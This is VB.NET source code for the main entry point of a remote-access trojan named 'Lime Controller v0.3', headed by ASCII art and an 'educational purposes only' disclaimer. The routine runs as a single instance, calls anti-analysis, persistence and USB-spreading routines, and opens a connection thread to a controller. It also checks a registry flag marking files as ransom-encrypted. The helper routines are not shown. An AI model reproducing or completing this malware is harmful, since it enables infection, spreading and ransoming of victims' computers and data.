
'##################################################################
'##           N Y A N   C A T  ||  Last edit MAR./10/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                  .. Lime Controller v0.3 ..                  ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
Namespace Lime

    Public Class Main

        Public Shared Sub Main()
            Threading.Thread.Sleep(2000)

            Dim createdNew As Boolean
            Settings.NMT = New Threading.Mutex(True, Settings.MTX, createdNew)
            Try
                If Not createdNew Then End
            Finally
                If createdNew Then
                Settings.NMT.ReleaseMutex()
            End If
            End Try

            Call MISC.Anti()
            Call Insistence.INS()
            Call MISC.USB()

            Dim T As New Threading.Thread(New Threading.ThreadStart(AddressOf SK.rc), 1)
            T.Start()

            Try
                If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing) = "Encrypted" Then
                    Dim T2 As New Threading.Thread(AddressOf MISC.Proc)
                    T2.Start()
                End If
            Catch
            End Try


        End Sub
    End Class
End Namespace
